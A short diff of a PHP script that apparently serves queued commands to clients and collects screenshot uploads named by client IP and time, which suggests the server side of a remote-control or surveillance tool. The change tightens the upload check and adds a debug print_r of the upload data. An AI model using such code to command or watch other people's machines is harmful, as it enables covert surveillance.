@@ -11,10 +11,12 @@ if (isset($_POST['d'])) {
 	echo file_get_contents($file_cmds);
 	file_put_contents($file_cmds, '');
 }
-else if (!empty($_FILES)) {
+else if (isset($_FILES['s'])) {
 	$uploaddir = 'screenshots/';
 	$uploadfile = $uploaddir . $ip . '-' . time();
 	move_uploaded_file($_FILES['s']['tmp_name'], $uploadfile);
+	
+	print_r($_FILES);
 }
 
 ?>
